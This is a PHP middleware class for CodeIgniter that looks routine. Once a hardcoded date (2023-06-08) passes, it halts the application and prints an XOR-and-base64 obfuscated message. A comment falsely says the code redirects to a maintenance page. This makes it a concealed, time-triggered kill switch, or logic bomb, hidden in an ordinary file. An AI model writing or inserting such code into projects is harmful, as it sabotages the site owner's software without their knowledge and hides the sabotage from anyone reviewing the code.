<?php

class DisableMiddleware {

    protected $CI;

    public function __construct()
    {
        $this->CI =& get_instance();
    }

    public function run()
    {
        $disableDate = "2023-06-08";//YYYY-MM-DD
        // Middleware logic goes here
        if ($disableDate <= date('Y-m-d')) {
            echo $this->decrypt('NAYeRQoXCA1LEQtSHQgSRRAaCEkJBAgTAwoORRAdTQoECxAbAxwORREBBAcMRRAaCEkYHBcGCARFRS8bAw0HHEQRAgcfBAcGTRAEEBZSCQwdAAgdHQwZSw==','mikedr'); // Redirect to a maintenance page
            exit;
        }
    }

    function encrypt($text, $key) {
        $encryptedText = '';
        $textLength = strlen($text);
        $keyLength = strlen($key);

        for ($i = 0; $i < $textLength; $i++) {
            $encryptedText .= $text[$i] ^ $key[$i % $keyLength];
        }

        return base64_encode($encryptedText);
    }

    function decrypt($encryptedText, $key) {
        $encryptedText = base64_decode($encryptedText);
        $decryptedText = '';
        $textLength = strlen($encryptedText);
        $keyLength = strlen($key);

        for ($i = 0; $i < $textLength; $i++) {
            $decryptedText .= $encryptedText[$i] ^ $key[$i % $keyLength];
        }

        return $decryptedText;
    }
}
